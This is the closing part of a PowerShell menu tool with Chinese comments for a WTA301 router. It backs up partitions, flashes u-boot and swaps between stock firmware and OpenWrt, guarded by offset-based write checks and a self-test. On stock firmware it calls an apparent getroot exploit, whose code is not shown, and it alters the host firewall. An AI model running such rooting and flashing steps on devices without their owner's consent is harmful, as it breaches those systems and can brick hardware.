        Write-Warn2 "没输入。默认按 192.168.1.1 试。"
        return "192.168.1.1"
    }
    return $p
}

function Read-PasswordOneShot {
    param([string]$Prompt)
    $sec = Read-Host $Prompt -AsSecureString
    if (-not $sec -or $sec.Length -eq 0) { return $null }
    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)
    try { return [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr) }
    finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
}

function Resolve-StockRootPassword {
    <#
        OpenWrt 本来就有 root，不需要 getroot —— 但密码得用户自己给。
        不预设、不猜、不写死：密码是用户的，工具不知道。
        试错允许重来（最多 3 次），不因为敲错一次就把整个流程踢回菜单。
    #>
    param([string]$Given, [int]$Tries = 3)
    if (-not $Given -and $Password) { $Given = $Password }
    if ($Given) { return $Given }

    Write-Info ""
    Write-Info "OpenWrt 本来就有 root，不需要 getroot。"
    Write-Info "请输入这台设备的 root 密码（如果不是你设的，就问设置的人）。"
    for ($i = 1; $i -le $Tries; $i++) {
        $pw = Read-PasswordOneShot ("   root 密码（第 {0}/{1} 次，输入不回显）: " -f $i, $Tries)
        if ($pw) { return $pw }
        Write-Warn2 "   密码不能为空。"
        if ($i -lt $Tries) { Write-Info "   （OpenWrt 出厂可能是空密码，那需要先在设备上 passwd 设一个）" }
    }
    throw "没有输入密码，无法登录。请先确认设备的 root 密码。"
}

function Invoke-FullStockToOpenWrt {
    <#
        原厂 -> OpenWrt 完整流程，顺序不能变：
          1) 备份原厂全部分区     <- 动任何东西之前先存底
          2) 刷 u-boot kit 两槽   <- 保证从 A 槽启动的是我们的 kit
          3) 刷 OpenWrt 到 A 槽   <- 最后才覆盖系统
        B 槽（0x0880000 / 0x0fc0000）全程不动，一直留作原厂回退。
        mtd0（一级 u-boot）永不碰。
    #>
    param($Sess, $Table, [string]$PcIp, [string]$PkgPath, [string]$BackupDir)

    Write-Step "[1/3] 备份原厂（动任何东西之前先存底）"
    $bk = Invoke-Backup -Sess $Sess -Table $Table -PcIp $PcIp -DestDir $BackupDir
    if (-not $bk) { throw "备份失败，中止（什么都没改）" }

    Write-Step "[2/3] 刷 u-boot kit（A 槽 0x4700000 + B 槽 0x700000，一级 u-boot 不动）"
    $ub = Join-Path $script:Here 'uboot\wta301-uboot-p21c.bin'
    [void](Invoke-FlashUbootKit -Sess $Sess -Table $Table -PcIp $PcIp -BinPath $ub)

    Write-Step "[3/3] 刷 OpenWrt 到 A 槽（内核 0x4880000 / rootfs 0x4fc0000）"
    [void](Invoke-FlashOpenWrt -Sess $Sess -Table $Table -PcIp $PcIp -PkgPath $PkgPath)
    Write-Ok "原厂 -> OpenWrt 完成。B 槽原厂回退保留在 0x0880000 / 0x0fc0000"
    return $true
}

function Invoke-FullOpenWrtToStock {
    <#
        OpenWrt -> 原厂完整流程。这条路**不动 u-boot**：
        两个槽的 kit 已经装好，留着没坏处（一级 u-boot 校验过去之后就交给 kit，
        kit 再按槽头决定 bootm 哪个内核）。
        只覆盖 A 槽的 kernel/rootfs 两个区，B 槽原厂仍然完好。
    #>
    param($Sess, $Table, [string]$PcIp, [string]$StockDir)

    # 不备份当前 OpenWrt。
    # 理由：原厂镜像本来就在 B 槽（0x880000 / 0xfc0000）完好躺着，刷坏了
    # 一级 u-boot 验 B 槽就退回原厂；想回 OpenWrt 再刷一遍安装包即可。
    # 备份这一份 OpenWrt 除了多等三十秒、多占 140MB，没有任何额外保险。
    # 真要存底，菜单里另有 [5] 整片备份，由用户自己选。

    Write-Step "[1/1] 刷原厂到 A 槽（内核 0x4880000 / rootfs 0x4fc0000）"
    [void](Invoke-FlashStock -Sess $Sess -Table $Table -PcIp $PcIp -StockDir $StockDir)
    return $true
}

function Main {
    Write-Host ""
    Write-Host " ====================================================================" -ForegroundColor Cyan
    Write-Host "   WTA301 一键工具（PowerShell，零依赖）" -ForegroundColor Cyan
    Write-Host "   OpenWrt <-> 原厂 互刷 / 备份 / u-boot" -ForegroundColor Cyan
    Write-Host " ====================================================================" -ForegroundColor Cyan
    Assert-Admin

    $devIp = Resolve-DeviceIp -Hint $Target
    $pcIp  = $PcIp
    if (-not $pcIp) { $pcIp = Find-PcIpFor -DeviceIp $devIp }
    if (-not $pcIp) { throw "本机没有和设备 $devIp 同网段的地址。请确认网线插在设备的 LAN1、本机也在同一网段。" }
    Write-Info "设备 $devIp   本机 $pcIp"

    # ---- 走哪条路由用户自己定，不探测 ----
    # 探测（看 22 端口）看着聪明，实际上是多余的：用户自己知道手上是什么固件。
    # 而且探测一旦判错，后面整条流程都是错的 —— 不如让人选。
    $kind = $Kind
    while (-not $kind) {
        Write-Host ""
        Write-Host " 现在板子上跑的是什么固件？" -ForegroundColor Cyan
        Write-Host "   [1] 原厂固件  —— 我要刷成 OpenWrt（会先 getroot，再备份原厂）"
        Write-Host "   [2] OpenWrt  —— 我要刷回原厂（输 root 密码就能进，本来就有 root）"
        Write-Host "   [0] 退出"
        $k = Read-Choice -Prompt "选 1 或 2"
        if ($k -eq '0') { return }
        if ($k -eq '1') { $kind = 'stock' }
        elseif ($k -eq '2') { $kind = 'openwrt' }
        else { Write-Warn2 "请输入 1 或 2" }
    }
    if ($kind -eq 'openwrt') {
        Write-Ok "路线：OpenWrt -> 原厂。SSH 登录（本来就有 root，不需要 getroot）"
    } else {
        Write-Ok "路线：原厂 -> OpenWrt。先 getroot 打进去，再备份原厂，最后刷"
    }

    $sess  = $null     # 当前 root 连接（跨菜单项复用）
    $nops  = 0
    # 用状态表而不是 scriptblock 闭包：
    # PowerShell 的 scriptblock 是动态作用域，函数里给 $pw 赋值传不出去
    # （这个坑在 Stop-BackgroundService 那次已经踩过，见 docs 第 5 节）
    $st = @{ Pw = $null; RootHandle = $null }

    while ($true) {
        Write-Host ""
        Write-Host " --------------------------------------------------------------------" -ForegroundColor DarkGray
        if ($sess) { Write-Host ("   [已连上 {0}   {1}]" -f $devIp, $(if ($kind -eq 'openwrt') { 'OpenWrt' } else { '原厂' })) -ForegroundColor Green }
        else       { Write-Host ("   [未连接   {0}]" -f $(if ($kind -eq 'openwrt') { 'OpenWrt' } else { '原厂' })) -ForegroundColor Yellow }

        if ($kind -eq 'openwrt') {
            Write-Host "     [1] 连接（输 root 密码，只连不刷）"
            Write-Host "     [2] ★ 一键：刷回原厂（A 槽 0x4880000 + 0x4fc0000，不备份、不动 u-boot）"
            Write-Host "     [3] 只刷 u-boot kit"
            Write-Host "     [4] 安全审计（只读）"
            Write-Host "     [5] 整片备份到本机"
        } else {
            Write-Host "     [1] getroot 建立连接（只连不刷）"
            Write-Host "     [2] ★ 一键：备份原厂 -> 刷 u-boot -> 刷 OpenWrt"
            Write-Host "     [3] 只备份原厂"
            Write-Host "     [4] 只刷 u-boot kit"
            Write-Host "     [5] 只刷 OpenWrt"
            Write-Host "     [6] 安全审计（只读）"
            Write-Host "     [7] 整片备份到本机"
        }
        Write-Host "     [9] 看分区表与风险说明"
        Write-Host "     [T] TTL 串口刷 u-boot（救砖；能上网就不用它）"
        Write-Host "     [0] 退出"
        Write-Host " --------------------------------------------------------------------" -ForegroundColor DarkGray

        $ch = Read-Choice
        if ($ch -eq '0' -or $ch -eq '') { break }
        if ($ch -eq '9') { Show-Explain; continue }

        if ($ch -ieq 'T') {
            $port = Read-Choice -Prompt "COM 口（如 COM5）"
            $bin  = Join-Path $script:Here 'uboot\wta301-uboot-p21c.bin'
            if (-not (Test-Path -LiteralPath $bin)) { Write-Err2 "找不到 $bin"; continue }
            try { [void](Invoke-TtlFlashUboot -ComPort $port -BinPath $bin -PcIp $pcIp) }
            catch { Write-Err2 $_.Exception.Message }
            continue
        }

        # ---- 需要 shell 的操作：先确保有连接，之后全部复用 ----
        try {
            if (-not $sess) {
                $sess = Open-DeviceSession -Kind $kind -DeviceIp $devIp -PcAddr $pcIp -State $st
            } else {
                Write-Info "[0] 复用已有连接（不会重新登录）"
                $probe = ''
                try { $probe = Invoke-Cmd -Sess $sess -Command "echo __PONG__" -TimeoutSec 15 } catch { }
                if ($probe -notmatch '__PONG__') {
                    Write-Warn2 "连接断了，重连"
                    Close-Device -Sess $sess; $sess = $null
                    $sess = Open-DeviceSession -Kind $kind -DeviceIp $devIp -PcAddr $pcIp -State $st
                }
            }
            $nops++
            Write-Info ("设备: {0}   第 {1} 次操作" -f $devIp, $nops)
            $table = Get-MtdTable -Sess $sess
            $facts = Get-DeviceFacts -Sess $sess -Table $table
            Write-Info ("当前固件: {0}  内核 {1}" -f $facts.Kind, $facts.Kernel)

            if ($kind -eq 'openwrt') {
                switch ($ch) {
                    '1' { Write-Ok "已连上，什么也没改" }
                    '2' {
                        $sd = if ($StockDir) { $StockDir } else { Join-Path $script:Here 'stock' }
                        [void](Invoke-FullOpenWrtToStock -Sess $sess -Table $table -PcIp $pcIp -StockDir $sd)
                    }
                    '3' {
                        $bin = Join-Path $script:Here 'uboot\wta301-uboot-p21c.bin'
                        [void](Invoke-FlashUbootKit -Sess $sess -Table $table -PcIp $pcIp -BinPath $bin)
                    }
                    '4' { [void](Invoke-Audit -Sess $sess -Table $table) }
                    '5' {
                        $d = if ($BackupDir) { $BackupDir } else { Join-Path $script:Here ("backup-" + (Get-Date -Format 'MMdd-HHmm')) }
                        [void](Invoke-Backup -Sess $sess -Table $table -PcIp $pcIp -DestDir $d)
                    }
                    default { Write-Warn2 "OpenWrt 模式下没有这一项（输 9 看说明）" }
                }
            } else {
                switch ($ch) {
                    '1' { Write-Ok "已拿到 root，什么也没改" }
                    '2' {
                        $pkg = Read-Choice -Prompt "OpenWrt 完整包路径（回车 = images\wta301-op-25.12.6-p29.bin）"
                        if (-not $pkg) { $pkg = Join-Path $script:Here 'images\wta301-op-25.12.6-p29.bin' }
                        $d = if ($BackupDir) { $BackupDir } else { Join-Path $script:Here ("backup-" + (Get-Date -Format 'MMdd-HHmm')) }
                        [void](Invoke-FullStockToOpenWrt -Sess $sess -Table $table -PcIp $pcIp -PkgPath $pkg -BackupDir $d)
                    }
                    '3' {
                        $d = if ($BackupDir) { $BackupDir } else { Join-Path $script:Here ("backup-" + (Get-Date -Format 'MMdd-HHmm')) }
                        [void](Invoke-Backup -Sess $sess -Table $table -PcIp $pcIp -DestDir $d)
                    }
                    '4' {
                        $bin = Join-Path $script:Here 'uboot\wta301-uboot-p21c.bin'
                        [void](Invoke-FlashUbootKit -Sess $sess -Table $table -PcIp $pcIp -BinPath $bin)
                    }
                    '5' {
                        $pkg = Read-Choice -Prompt "OpenWrt 完整包路径（回车 = images\wta301-op-25.12.6-p29.bin）"
                        if (-not $pkg) { $pkg = Join-Path $script:Here 'images\wta301-op-25.12.6-p29.bin' }
                        [void](Invoke-FlashOpenWrt -Sess $sess -Table $table -PcIp $pcIp -PkgPath $pkg)
                    }
                    '6' { [void](Invoke-Audit -Sess $sess -Table $table) }
                    '7' {
                        $d = if ($BackupDir) { $BackupDir } else { Join-Path $script:Here ("backup-" + (Get-Date -Format 'MMdd-HHmm')) }
                        [void](Invoke-Backup -Sess $sess -Table $table -PcIp $pcIp -DestDir $d)
                    }
                    default { Write-Warn2 "原厂模式下没有这一项（输 9 看说明）" }
                }
            }
        } catch {
            Write-Err2 $_.Exception.Message
            if ($sess -and -not (Test-SessionAlive $sess)) { Close-Device -Sess $sess; $sess = $null }
        }
    }

    Write-Step "[收尾] 关闭连接、停服务、撤销本机改动"
    if ($sess) { Close-Device -Sess $sess }
    if ($st.RootHandle) { Close-GetRootHandle -Handle $st.RootHandle }
    Write-Info "会话结束（共 $nops 次操作）"
    Write-Info "日志: $script:LogPath"
}

function Open-DeviceSession {
    # 两条路各走各的：OpenWrt 用 SSH 密码，原厂用 getroot。
    param([string]$Kind, [string]$DeviceIp, [string]$PcAddr, [hashtable]$State)
    if ($Kind -eq 'openwrt') {
        for ($try = 1; $try -le 3; $try++) {
            if (-not $State.Pw) { $State.Pw = Resolve-StockRootPassword }
            Write-Step ("[连接] OpenWrt SSH 登录 {0}（root，第 {1}/3 次）" -f $DeviceIp, $try)
            try {
                $ch = Enable-ShellChannel -DeviceIp $DeviceIp -Password $State.Pw
                if ($ch.Mode -eq 'telnet') {
                    return (Connect-Device -Ip $DeviceIp -TcpPort $ch.Port -TimeoutMs 8000)
                }
                return (Open-SshSession -Ip $DeviceIp -User 'root' -Password $State.Pw)
            } catch {
                if ($_.Exception.Message -notmatch '密码不对|SSH 登录失败|Permission denied') { throw }
                Write-Warn2 "   密码不对。"
                $State.Pw = $null
                if ($try -ge 3) { throw "连续 3 次密码不对。请确认设备的 root 密码后再试。" }
            }
        }
    }
    $r = Invoke-GetRoot -DeviceIp $DeviceIp -PcAddr $PcAddr -Persist
    $State.RootHandle = $r
    return $r.Sess
}

function Close-GetRootHandle {
    # Invoke-GetRoot 返回的是数据（http/elink/别名/防火墙），
    # 没有内置的 Cleanup 方法 —— 所以收尾要在这里显式逐个关。
    param($Handle)
    if (-not $Handle) { return }
    if ($Handle.Http)  { Stop-BackgroundService -State $Handle.Http  -Name 'HTTP' }
    if ($Handle.Elink) { Stop-BackgroundService -State $Handle.Elink -Name 'e-Link' }
    try { Remove-GatewayAlias -IfIndex $Handle.IfIndex -Addrs $Handle.NewAliases } catch { }
    try { Disable-FirewallPort } catch { }
}

function Test-SessionAlive {
    param($Sess)
    if (-not $Sess) { return $false }
    if ($Sess.Kind -eq 'ssh') {
        return [bool]($Sess.Ask -and (Test-Path -LiteralPath $Sess.Ask) -and (Test-PortOpen -Ip $Sess.Ip -TcpPort 22 -TimeoutMs 900))
    }
    try { return $Sess.Stream.CanRead } catch { return $false }
}

function Invoke-SelfTest {
    Write-Host ""
    Write-Host " === 离线自检（不连设备、不写任何东西） ===" -ForegroundColor Cyan
    $bad = 0

    Write-Info ("PowerShell {0}  ({1})" -f $PSVersionTable.PSVersion, $PSVersionTable.PSEdition)
    if ($PSVersionTable.PSVersion.Major -lt 5) { Write-Err2 "需要 PowerShell 5.1+"; $bad++ }
    else { Write-Ok "PowerShell 版本 OK" }

    Write-Info ("串口: {0}" -f (([System.IO.Ports.SerialPort]::GetPortNames() -join ', ') -replace '^$','(无)'))
    Write-Info ("管理员: {0}" -f ((New-Object Security.Principal.WindowsPrincipal(
        [Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)))

    # DH
    try {
        $p = [System.Numerics.BigInteger]::Parse('c90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff','HexNumber')
        $g = [System.Numerics.BigInteger] 2
        $a = [System.Numerics.BigInteger]::Parse('1234567890abcdef1234567890abcdef','HexNumber')
        $pub = [System.Numerics.BigInteger]::ModPow($g, $a, $p)
        if ($pub -gt 1) { Write-Ok "DH 2048-bit 模幂 OK" } else { Write-Err2 "DH 失败"; $bad++ }
    } catch { Write-Err2 "DH 异常: $($_.Exception.Message)"; $bad++ }

    # AES
    try {
        $k = [byte[]](0..15)
        $d = [Text.Encoding]::UTF8.GetBytes('{"type":"keyngreq"}')
        $ct = Protect-Aes -Key $k -Data $d
        $back = [Text.Encoding]::UTF8.GetString((Unprotect-Aes -Key $k -Data $ct)).Trim([char]0)
        if ($back -eq '{"type":"keyngreq"}') { Write-Ok "AES-128-CBC 加解密 OK" }
        else { Write-Err2 "AES 回环不符"; $bad++ }
    } catch { Write-Err2 "AES 异常: $($_.Exception.Message)"; $bad++ }

    # 镜像 md5 与物理槽对应关系（这是最容易搞错的地方）
    Write-Info ""
    Write-Info "镜像核对（文件名 vs 物理偏移，两者会反，所以只认 md5）:"
    $stock = Join-Path $script:Here 'stock'
    $want = @(
        @{ F='mtd5_kernel.bin';        Md5='170b2188884cc040d64ac5bed7ddc365'; Slot='A 槽 kernel 0x4880000' }
        @{ F='mtd6_rootfs.bin';        Md5='30f487419d90b2239b65035390f3b73f'; Slot='A 槽 rootfs 0x4fc0000' }
        @{ F='mtd10_kernel_bak.bin';   Md5='2868d8e975da7c641e54c72b6beb8f26'; Slot='B 槽 kernel 0x880000' }
        @{ F='mtd11_rootfs_bak.bin';   Md5='bf2f92ceaf509093c8854825f2dc8d5e'; Slot='B 槽 rootfs 0xfc0000' }
    )
    foreach ($w in $want) {
        $p = Join-Path $stock $w.F
        $got = Get-LocalMd5 -Path $p
        if (-not $got) { Write-Warn2 "$($w.F) 缺失"; continue }
        if ($got -eq $w.Md5) { Write-Ok "$($w.F)  ->  $($w.Slot)" }
        else { Write-Err2 "$($w.F) md5 不符 期望 $($w.Md5) 实得 $got"; $bad++ }
    }

    # ---- 写入门禁：必须真的抛异常，不是返回 false ----
    Write-Info ""
    Write-Info "写入门禁用例:"
    # 用例按绝对偏移，不按 mtd 编号 —— 编号跨固件会错位
    $cases = @(
        @{ Off=0x0000000; Action='flash-op';    Want=$false; Why='factory_boot 一级 u-boot，TTL 命脉' }
        @{ Off=0x0400000; Action='flash-stock'; Want=$false; Why='factory_info 出厂信息' }
        @{ Off=0x0480000; Action='flash-uboot'; Want=$false; Why='art 射频校准' }
        @{ Off=0x4000000; Action='flash-op';    Want=$false; Why='boot_flag' }
        @{ Off=0x0700000; Action='flash-op';    Want=$false; Why='u-boot B 槽只能由 flash-uboot 写' }
        @{ Off=0x4700000; Action='restore-bslot'; Want=$false; Why='u-boot A 槽只能由 flash-uboot 写' }
        @{ Off=0x0880000; Action='flash-stock'; Want=$false; Why='内核 B 槽（原厂回退）只能由 restore-bslot 写' }
        @{ Off=0x0FC0000; Action='flash-uboot'; Want=$false; Why='rootfs B 槽只能由 restore-bslot 写' }
        @{ Off=0x4880000; Action='flash-op';    Want=$true;  Why='内核 A 槽，flash-op 合法' }
        @{ Off=0x4880000; Action='flash-stock'; Want=$true;  Why='内核 A 槽，flash-stock 合法' }
        @{ Off=0x4FC0000; Action='flash-op';    Want=$true;  Why='rootfs A 槽，flash-op 合法' }
        @{ Off=0x4FC0000; Action='flash-stock'; Want=$true;  Why='rootfs A 槽，flash-stock 合法' }
        @{ Off=0x0700000; Action='flash-uboot'; Want=$true;  Why='u-boot B 槽，flash-uboot 合法' }
        @{ Off=0x4700000; Action='flash-uboot'; Want=$true;  Why='u-boot A 槽，flash-uboot 合法' }
        @{ Off=0x0880000; Action='restore-bslot'; Want=$true; Why='内核 B 槽，restore-bslot 合法' }
        @{ Off=0x0FC0000; Action='restore-bslot'; Want=$true; Why='rootfs B 槽，restore-bslot 合法' }
    )
    foreach ($c in $cases) {
        $threw = $false
        try { [void](Test-WriteAllowed -AbsOffset $c.Off -Action $c.Action) } catch { $threw = $true }
        $allowed = -not $threw
        if ($allowed -eq $c.Want) {
            Write-Ok ("{0,-9} {1,-14} -> {2}  ({3})" -f (Format-Hex $c.Off), $c.Action,
                      $(if ($allowed) { '允许' } else { '拒绝' }), $c.Why)
        } else {
            Write-Err2 ("{0,-9} {1,-14} -> 期望 {2} 实际 {3}  ({4})" -f (Format-Hex $c.Off), $c.Action,
                        $(if ($c.Want) { '允许' } else { '拒绝' }),
                        $(if ($allowed) { '允许' } else { '拒绝' }), $c.Why)
            $bad++
        }
    }

    Write-Info ""
    Write-Info "其他文件:"
    $others = @(
        @{ P='images\wta301-op-25.12.6-p29.bin';            Md5='c5ac0911accd2ec48033329c383d5c4c' }
        @{ P='images\wta301-op-25.12.6-p29-sysupgrade.bin'; Md5='76df463df4d8b5acba5d52852870c127' }
        @{ P='uboot\wta301-uboot-p21c.bin';                 Md5='d0ada9f76e4f1aba9b96a559a5220cee' }
    )
    foreach ($w in $others) {
        $p = Join-Path $script:Here $w.P
        $got = Get-LocalMd5 -Path $p
        if (-not $got) { Write-Warn2 "$($w.P) 缺失"; continue }
        if ($got -eq $w.Md5) { Write-Ok ("{0}  {1}" -f $w.P, $got) }
        else { Write-Err2 "$($w.P) md5 不符 期望 $($w.Md5) 实得 $got"; $bad++ }
    }

    Write-Host ""
    if ($bad -eq 0) { Write-Host " 自检通过，可以开始。" -ForegroundColor Green }
    else { Write-Host (" 自检有 {0} 项问题，先修这些再动设备。" -f $bad) -ForegroundColor Red }
    Write-Host ""
    return $bad
}

if ($SelfTest) {
    try { [void](Invoke-SelfTest) } catch { Write-Err2 $_.Exception.Message; exit 1 }
    return
}

try {
    Main
} catch {
    Write-Host ""
    Write-Host (" [错误] " + $_.Exception.Message) -ForegroundColor Red
    Write-Log $_.Exception.ToString() 'FATAL'
    Write-Host ""
    Write-Host " 详细日志: $script:LogPath" -ForegroundColor DarkGray
    exit 1
}
